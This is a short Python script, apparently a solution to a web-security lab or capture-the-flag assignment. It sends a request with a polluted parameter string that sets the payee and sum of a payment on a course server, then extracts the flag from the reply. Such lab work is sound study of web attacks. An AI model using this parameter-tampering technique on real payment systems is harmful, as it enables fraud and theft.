import requests
import re
base_url="http://www.wsb.com/Assignment2/case14.php?"
polluted_parameter="payee=alice&sum=1000000"
r=requests.get(base_url+polluted_parameter)
#print(r.text)
re_result=re.findall("The flag is (.*)?<br/>",r.text)
print("The flag is:"+re_result[0])
